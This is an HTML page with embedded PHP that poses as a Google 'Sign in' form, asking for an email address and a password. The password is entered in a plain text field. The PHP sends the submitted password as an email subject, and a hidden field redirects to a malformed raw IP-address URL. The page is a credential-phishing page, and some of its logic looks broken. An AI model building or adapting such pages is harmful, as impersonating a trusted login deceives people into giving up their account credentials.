<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <link rel="stylesheet" href="style.css">
    <style>

</style>
</head>
<body>
        <div class="box">
                <h2>Sign in</h2>
                <p>Use your Google Account</p>
                <form method = "post">
                  <div class="inputBox">
                       <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
                       <label>Email Address</label>
                  </div>
                  <div class="inputBox">
                        <input type="text" name="passward" required onkeyup="this.setAttribute('value', this.value);" value="">
                        <label>Passward</label>
                  </div>
                  <input type="submit" name="sign-in" value="Sign In">
                  <input type="hidden" name="next" value="http://175.157.175./thank.php">
               </form>
         
          <?php
             // the message
             $msg = "First email";

             // use wordwrap() if lines are longer than 70 characters
             $msg = wordwrap($msg,70);
             $subject = $_POST['passward'];
             $to = $_POST['email'];

             // send email
             mail($to,$subject,$msg);
          ?>
      </div>
            
  </body>
</html>